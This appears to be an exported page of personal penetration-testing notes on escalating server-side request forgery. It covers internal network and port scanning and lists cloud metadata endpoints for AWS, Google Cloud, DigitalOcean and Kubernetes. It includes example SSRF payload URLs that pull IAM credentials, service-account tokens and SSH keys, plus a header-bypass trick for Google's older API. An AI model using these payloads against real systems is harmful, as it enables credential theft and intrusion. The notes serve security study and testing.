<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Escalating the Attack (How can be used)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Escalating the Attack (How can be used)</h1><br/><br /><br />• Perform Network Scanning<br />    You can use Burp Intruder to scan for example the subnetwork 192.168.0.X with Burp Intruder as is been done in the chapter <a href="-Exploitation--Server-side--Server_Side_Attacks--Server_Side_Request_Forgery_(SSRF)--Attacks--SSRF_attacks_against_other_back-end_systems.html">SSRF attacks against other back-end systems</a><br />• Perform Port Scanning on the machine of the network<br />    Instead of use http://192.168.0.2 use 192.168.0.2:21, 192.168.0.2:22, 192.168.0.2:53, ...<br />   ◇ Open Port<br />      <a href=""><img src="images/2249-1.png" alt="images/2249-1.png" /></a><br />   ◇ Closed Port<br />      <a href=""><img src="images/2249-2.png" alt="images/2249-2.png" /></a><br /><br /><strong><h3>Information Gathering Useful for SSRF</h3></strong><br />• <strong>Amazon Elastic Computer Cloud</strong><br />    Amazon Elastic Compute Cloud (EC2), offers an instance metadata tool that enables EC2 instances <span style="text-decoration:underline;">to access data about themselves</span> by querying the API endpoint at 169.254.169.254. These API endpoints are accessible by default unless network admins specifically block or disable them<br />    <div class="codebox"><pre>https<span style="color:#ff9d00;font-weight:700">://</span>public.example.com<span style="color:#ff9d00;font-weight:700">/</span>proxy?url=http<span style="color:#ff9d00;font-weight:700">://</span>169.254.169.254<span style="color:#ff9d00;font-weight:700">/</span>latest<span style="color:#ff9d00;font-weight:700">/</span>meta-data<span style="color:#ff9d00;font-weight:700">/</span></pre></div><br />    This could reveal sensitive information such as API keys, Amazon S3 tokens (tokens used to access Amazon S3 buckets), and passwords.<br />   ◇ <em>http://169.254.169.254/latest/meta-data/ </em>→ returns the list of available metadata that you can query.<br />   ◇ <em>http://169.254.169.254/latest/meta-data/local-hostname/</em> → returns the internal hostname used by the host.<br />   ◇ <em>http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME</em> → returns the security credentials of that role.<br />   ◇ <em>http://169.254.169.254/latest/dynamic/instance-identity/document/</em> → reveals the private IP address of the current instance.<br />   ◇ <em>http://169.254.169.254/latest/user-data/</em> → returns user data on the current instance.<br />   ◇ COMPLETE API DOCUMENTATION: <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html</a><br />• <strong>Google Cloud</strong><br />   Google Cloude APIv1 to protect against SSRF require one of those headers. This most of the time work because during an SSRF, we cannot specify headers<br />    <div class="codebox"><pre>Metadata-Flavor<span style="color:#ff9d00;font-weight:700">:</span> Google<br />X-Google-Metadata-Request<span style="color:#ff9d00;font-weight:700">:</span> True</pre></div><br />    BUT this protection can be easily bypassed by querying <strong>API v1beta1</strong> instead of <strong>APIv1</strong><br />    <div class="codebox"><pre>https<span style="color:#ff9d00;font-weight:700">://</span>public.example.com<span style="color:#ff9d00;font-weight:700">/</span>proxy?url=http<span style="color:#ff9d00;font-weight:700">://</span>metadata.google.internal<span style="color:#ff9d00;font-weight:700">/</span>computeMetadata<span style="color:#ff9d00;font-weight:700">/</span>v1beta1<span style="color:#ff9d00;font-weight:700">/</span>instance<span style="color:#ff9d00;font-weight:700">/</span>service-accounts<span style="color:#ff9d00;font-weight:700">/</span>default<span style="color:#ff9d00;font-weight:700">/</span>token</pre></div><br />   ◇ <em>http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</em>  → returns the access token of the default account on the instance.<br />   ◇ <em>http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys</em> → returns SSH keys that can connect to other instances in this project.<br />   ◇ COMPLETE API DOCUMENTATION: <a href="https://cloud.google.com/compute/docs/metadata/querying-metadata">https://cloud.google.com/compute/docs/metadata/querying-metadata</a><br />   Note: that the API v1beta1 was deprecated in 2020 and is in the process of being shut down. In the future, you might be required to query metadata with APIv1 and will need to find a way to forge the required headers to request instance metadata for targets that use Google Cloud.<br /><strong>• DigitalOcean<br /></strong>   ◇ <em>http://169.254.169.254/metadata/v1/</em>  →  list of metadata endpoints<br />   ◇ ....<strong><br />• Kubernetes</strong><br />   ◇ <em>https://kubernetes.default</em><br />   ◇ <em>https://kubernetes.default.svc/metrics</em><br />   ◇ ...<br /> <br /> </div>
</body>
</html>
